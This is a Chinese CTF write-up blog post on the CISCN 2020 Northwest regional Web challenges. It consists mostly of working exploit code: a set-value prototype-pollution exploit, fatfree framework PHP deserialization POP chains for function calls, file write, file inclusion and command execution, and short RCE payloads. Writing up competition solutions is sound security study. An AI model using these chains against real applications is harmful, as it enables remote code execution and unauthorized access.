---
title: 第十三届全国大学生信息安全竞赛西北赛区 Web题目 Writeup
tags: 
    - Writeup
    - CTF
date: 2020/8/21
---

Web狗无法在险恶的CTF世界中存活

CISCN2020 落幕，web所有题加起来还不如misc/crypto/re题的零头，吐了

## littlegame

js原型链污染，`set-value`库3.0.0旧版本。公开exploit如下：

```javascript
const setFn = require('set-value');
const paths = ['constructor.prototype.a0', '__proto__.a1',];
(function () {
    for (const p of paths) { setFn({}, p, true); }
    for (let i = 0; i < paths.length; i++) {
        if (({})[`a${i}`] === true) {
            console.log(`Yes with ${paths[i]}`);
        }
    }
})()
```

拿来主义，用就完了

阅读源码，可以发现在`/Privilege`处进行了`set-value`调用，并且在`/DeveloperControlPanel`处检查了`Admin`对象（一个普通的数组）的任意可控属性，那污染字典类型的原型，添加一个自定义属性即可。

最终exploit：

```python
from requests import session
ses = session()
host = ''

ses.get(host + '/SpawnPoint')
ses.post(host + '/Privilege', data={
    'NewAttributeKey': '__proto__.pwd',
    'NewAttributeValue': 'frankli'
})
print(ses.post(host + '/DeveloperControlPanel', data={
    'key': 'pwd',
    'password': 'frankli'
}).text)
```

## babyserialize

fatfree框架POP链挖掘

前段时间在WMCTF中挖的链被断掉了，稍微改一改

第一次见flag直接放phpinfo里头的。。。找了半天没找到。。。

在这里把挖到的几条链都放一下吧

### 单个任意参数调用任意函数

```python
@namespace('CLI')
class WS:
    # call func with one param
    def __init__(self, func, param):
        @namespace('CLI')
        class Agent():
            class Base:
                @namespace('DB\\Jig')
                class Mapper:
                    @namespace('DB\\SQL')
                    class Mapper:
                        protected_props = {'read': func}
                    protected_file = param
                    protected_db = Mapper()
                events = {'disconnect': [Mapper(), 'insert']}
            protected_server = Base()
        self.a = Agent()  # autoload
# payload: serialize(WS())
```

### 任意文件写

```python
@namespace('DB')
class Jig:
    # write file
    lazy = True
    data = {'frankli.php': {
        'asdf': '<?php phpinfo();exit();?>'
    }}
    dir = '/tmp/'
    format = 0
```

### 任意（存在的）文件包含

结合上面调用函数的链调用`\View->render`

```python
class View:
    # arbitrary **exisiting** file inclusion
    class Base:
        TEMP = '/tmp/'
        UI = '/tmp/'
    fw = Base()

print(ses.get(url, params={'flag': serialize(
    WS([View(), 'render'], 'frankli.php'))}
).text)
```

### wmctf的时候挖的rce链

结合上面调用函数的链调用`\Preview->resolve`  
然而这次`resolve`被删了  

```python
@namespace('CLI')
class WS:
    @namespace('CLI')
    class Agent():
        class F3:  # 随便一个存在的类
            class Preview:
                class Base:
                    hive = {'node': f'<?php system("ls");die(1);?>'}
                fw = Base()
            events = {'disconnect': [Preview(), 'resolve']}
        server = F3()
    a = Agent()
```

入口点和上面函数调用的是一样的

## easytrick

一开始是联想到了Nu1l在某处的论坛里发的利用`Exception`的`__toString`来绕过判等（属性不同，不强等于），但是无奈太长了  
`SimpleXMLElement`也找不到合适的方式利用(有可能么？)

后来想了想，不可能是利用对象的`__toString`来绕过，因为这样无法同时绕过三个判断

最后发现`1.00...001`在转字符串的时候会变成`1`

```python
class trick:
    trick1 = 1.00000000000001
    trick2 = 1.000000000000001
print(serialize(trick()))
```

## 剩下两道就放个payload吧。。

* rceme: 没过滤反引号 `?a={if:var_dump(``ls``)}{end if}`
* easyphp: Apache收到SIGUSR1的时候会软重启 `?a=call_user_func&b=pcntl_wait`
